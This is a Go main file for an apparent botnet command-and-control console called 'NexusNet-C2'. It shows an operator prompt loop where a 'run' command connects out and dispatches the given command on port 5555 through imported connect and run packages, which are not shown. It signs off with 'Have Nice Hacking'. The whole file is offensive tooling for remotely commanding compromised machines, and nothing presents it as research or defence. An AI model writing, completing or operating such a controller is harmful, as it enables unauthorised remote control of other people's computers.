package main

import (
	"bufio"
	"fmt"
	"os"
	"strings"

	connect "lbot.init/project/cmd/connect"
	run "lbot.init/project/cmd/run"
	banner "lbot.init/project/pkg/banner"
	clear "lbot.init/project/pkg/clear"
)

func main() {
	clear.ClearTerminal()
	banner.Pbanner()
	scaner := bufio.NewScanner(os.Stdin)
	scaner.Scan()
	for {
		fmt.Println("NexusNet-C2#>")
		scaner.Scan()
		input := scaner.Text()

		if strings.ToLower(input) == "exit" {
			fmt.Println("Have Nice Hacking")
			break
		}

		if strings.HasPrefix(strings.ToLower(input), "run ") {
			excutec := strings.TrimSpace(strings.TrimPrefix(strings.ToLower(input), "run "))
			customPort := 5555
			fmt.Printf("\n[+]Running Command\n")
			connect.Connect()
			run.Run(excutec, customPort)
		} else {
			// Your logic for processing regular input goes here
			fmt.Println("You entered:", input)
		}
	}

}
